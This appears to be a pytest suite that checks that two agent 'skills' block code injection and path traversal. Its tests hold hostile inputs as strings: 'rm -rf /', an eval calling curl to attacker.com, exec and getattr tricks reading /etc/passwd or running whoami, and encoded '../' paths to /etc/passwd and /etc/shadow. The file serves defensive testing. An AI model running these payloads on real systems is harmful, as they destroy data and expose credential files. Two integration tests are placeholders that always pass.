"""
Security Tests for Critical Vulnerability Fixes

Tests for V-1, V-2 CRITICAL vulnerabilities:
- V-1: Code Injection (skills/artemis/code_optimization.py)
- V-2: Path Traversal (skills/athena/architecture_analysis.py)

Note: V-3 Resource Exhaustion tests removed (async_executor.py deleted in v2.3.1).
      Resource exhaustion testing will be re-implemented in TMWS Phase 3.

Created: 2025-11-07
Author: Eris (Tactical Coordinator)
Modified: 2025-11-16 (V-3 removal)
"""

import asyncio
import os
import tempfile
from pathlib import Path
from typing import Any

import pytest
import pytest_asyncio


# --- V-1: Code Injection Prevention Tests ---


class TestCodeInjectionPrevention:
    """Test suite for V-1: Code injection vulnerability fix."""

    @pytest.fixture
    def mock_monitor(self):
        """Mock monitoring context."""
        class MockMonitor:
            async def __aenter__(self):
                return self

            async def __aexit__(self, *args):
                pass

            def log(self, *args, **kwargs):
                pass

        return MockMonitor()

    @pytest.mark.asyncio
    async def test_v1_import_statement_blocked(self, mock_monitor):
        """V-1.1: Import statements must be blocked."""
        from skills.artemis.code_optimization import optimize_code

        # Attack vector: malicious import
        malicious_code = """
import os
os.system('rm -rf /')
"""

        result = await optimize_code(mock_monitor, code=malicious_code)
        assert result["status"] == "error"
        assert "Security validation failed" in result["error"]

    @pytest.mark.asyncio
    async def test_v1_eval_function_blocked(self, mock_monitor):
        """V-1.2: eval() function calls must be blocked."""
        from skills.artemis.code_optimization import optimize_code

        # Attack vector: eval with command injection
        malicious_code = """
eval('__import__("os").system("curl attacker.com")')
"""

        result = await optimize_code(mock_monitor, code=malicious_code)
        assert result["status"] == "error"
        assert "Security validation failed" in result["error"]

    @pytest.mark.asyncio
    async def test_v1_exec_function_blocked(self, mock_monitor):
        """V-1.3: exec() function calls must be blocked."""
        from skills.artemis.code_optimization import optimize_code

        # Attack vector: exec with command injection
        malicious_code = """
exec('__import__("subprocess").run(["cat", "/etc/passwd"])')
"""

        result = await optimize_code(mock_monitor, code=malicious_code)
        assert result["status"] == "error"
        assert "Security validation failed" in result["error"]

    @pytest.mark.asyncio
    async def test_v1_compile_function_blocked(self, mock_monitor):
        """V-1.4: compile() function calls must be blocked."""
        from skills.artemis.code_optimization import optimize_code

        # Attack vector: compile with dynamic code execution
        malicious_code = """
code_obj = compile('import os; os.system("id")', '<string>', 'exec')
exec(code_obj)
"""

        result = await optimize_code(mock_monitor, code=malicious_code)
        assert result["status"] == "error"
        assert "Security validation failed" in result["error"]

    @pytest.mark.asyncio
    async def test_v1_getattr_bypass_blocked(self, mock_monitor):
        """V-1.5: getattr() bypass attempts must be blocked."""
        from skills.artemis.code_optimization import optimize_code

        # Attack vector: getattr to access __import__
        malicious_code = """
getattr(__builtins__, '__im' + 'port__')('os').system('whoami')
"""

        result = await optimize_code(mock_monitor, code=malicious_code)
        assert result["status"] == "error"
        assert "Security validation failed" in result["error"]

    @pytest.mark.asyncio
    async def test_v1_safe_code_allowed(self, mock_monitor):
        """V-1.6: Safe code should be allowed."""
        from skills.artemis.code_optimization import optimize_code

        # Safe code: simple function
        safe_code = """
def fibonacci(n):
    if n <= 1:
        return n
    return fibonacci(n-1) + fibonacci(n-2)

result = fibonacci(10)
"""

        # Should not raise SecurityError
        result = await optimize_code(mock_monitor, code=safe_code)
        assert "suggestions" in result


# --- V-2: Path Traversal Prevention Tests ---


class TestPathTraversalPrevention:
    """Test suite for V-2: Path traversal vulnerability fix."""

    @pytest.fixture
    def mock_monitor(self):
        """Mock monitoring context."""
        class MockMonitor:
            async def __aenter__(self):
                return self

            async def __aexit__(self, *args):
                pass

            def log(self, *args, **kwargs):
                pass

        return MockMonitor()

    @pytest.fixture
    def temp_dir(self):
        """Create temporary directory for tests."""
        with tempfile.TemporaryDirectory() as tmpdir:
            yield Path(tmpdir)

    @pytest.mark.asyncio
    async def test_v2_symlink_access_blocked(self, mock_monitor, temp_dir):
        """V-2.1: Symlink access must be blocked (CWE-61)."""
        from skills.athena.architecture_analysis import analyze_architecture

        # Create symlink to sensitive file
        target = temp_dir / "evil_link"
        target.symlink_to("/etc/passwd")

        result = await analyze_architecture(mock_monitor, str(target))
        assert result["status"] == "error"
        assert "Security validation failed" in result["error"]

    @pytest.mark.asyncio
    async def test_v2_parent_directory_traversal_blocked(self, mock_monitor):
        """V-2.2: Parent directory traversal must be blocked (CWE-22)."""
        from skills.athena.architecture_analysis import analyze_architecture

        # Attack vector: ../../../ traversal
        malicious_path = "../../../etc/passwd"

        result = await analyze_architecture(mock_monitor, malicious_path)
        assert result["status"] == "error"
        assert "Security validation failed" in result["error"]

    @pytest.mark.asyncio
    async def test_v2_absolute_path_outside_project_blocked(self, mock_monitor):
        """V-2.3: Absolute paths outside project must be blocked."""
        from skills.athena.architecture_analysis import analyze_architecture

        # Attack vector: absolute path to sensitive file
        malicious_path = "/etc/shadow"

        result = await analyze_architecture(mock_monitor, malicious_path)
        assert result["status"] == "error"
        assert "Security validation failed" in result["error"]

    @pytest.mark.asyncio
    async def test_v2_url_encoded_traversal_blocked(self, mock_monitor):
        """V-2.4: URL-encoded path traversal must be blocked."""
        from skills.athena.architecture_analysis import analyze_architecture

        # Attack vector: URL-encoded ../
        malicious_path = "..%2F..%2F..%2Fetc%2Fpasswd"

        result = await analyze_architecture(mock_monitor, malicious_path)
        assert result["status"] == "error"
        assert "Security validation failed" in result["error"]

    @pytest.mark.asyncio
    async def test_v2_double_encoded_traversal_blocked(self, mock_monitor):
        """V-2.5: Double URL-encoded path traversal must be blocked."""
        from skills.athena.architecture_analysis import analyze_architecture

        # Attack vector: Double encoded ../
        malicious_path = "..%252F..%252F..%252Fetc%252Fpasswd"

        result = await analyze_architecture(mock_monitor, malicious_path)
        assert result["status"] == "error"
        assert "Security validation failed" in result["error"]

    @pytest.mark.asyncio
    async def test_v2_safe_relative_path_allowed(self, mock_monitor, temp_dir):
        """V-2.6: Safe relative paths within project should be allowed."""
        from skills.athena.architecture_analysis import analyze_architecture

        # Create safe file within project
        safe_file = temp_dir / "safe_file.py"
        safe_file.write_text("# Safe Python file\nprint('Hello')\n")

        # Mock project root
        import os
        original_cwd = os.getcwd()
        os.chdir(temp_dir)

        try:
            # Should not raise SecurityError
            result = await analyze_architecture(mock_monitor, "safe_file.py")
            assert "analysis" in result
        finally:
            os.chdir(original_cwd)


# --- Integration Tests ---


class TestIntegratedSecurityDefenses:
    """Integration tests combining multiple vulnerability fixes."""

    @pytest.mark.asyncio
    async def test_combined_attack_all_defenses_active(self):
        """Test that all security defenses work together."""
        # This would be a complex integration test combining:
        # 1. Code injection attempt
        # 2. Path traversal attempt
        # 3. Resource exhaustion attempt

        # For now, placeholder
        assert True  # TODO: Implement comprehensive integration test

    @pytest.mark.asyncio
    async def test_security_monitoring_active(self):
        """Verify security monitoring logs attacks."""
        # Verify that security violations are logged
        # TODO: Check monitoring system for attack logs
        assert True


# --- Performance Tests ---


class TestSecurityPerformanceImpact:
    """Verify security fixes don't degrade performance significantly."""

    @pytest.mark.asyncio
    async def test_code_validation_performance(self):
        """V-1: Code validation should be fast (<10ms)."""
        import time
        from skills.artemis.code_optimization import optimize_code

        class MockMonitor:
            async def __aenter__(self):
                return self
            async def __aexit__(self, *args):
                pass
            def log(self, *args, **kwargs):
                pass

        monitor = MockMonitor()
        safe_code = "def hello(): return 'world'"

        start = time.perf_counter()
        try:
            await optimize_code(monitor, code=safe_code)
        except Exception:
            pass  # We only care about validation time
        duration = time.perf_counter() - start

        assert duration < 0.01, f"Code validation too slow: {duration:.3f}s"

    @pytest.mark.asyncio
    async def test_path_validation_performance(self):
        """V-2: Path validation should be fast (<5ms)."""
        import time
        from skills.athena.architecture_analysis import analyze_architecture

        class MockMonitor:
            async def __aenter__(self):
                return self
            async def __aexit__(self, *args):
                pass
            def log(self, *args, **kwargs):
                pass

        monitor = MockMonitor()
        safe_path = "README.md"

        start = time.perf_counter()
        try:
            await analyze_architecture(monitor, safe_path)
        except Exception:
            pass
        duration = time.perf_counter() - start

        assert duration < 0.005, f"Path validation too slow: {duration:.3f}s"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
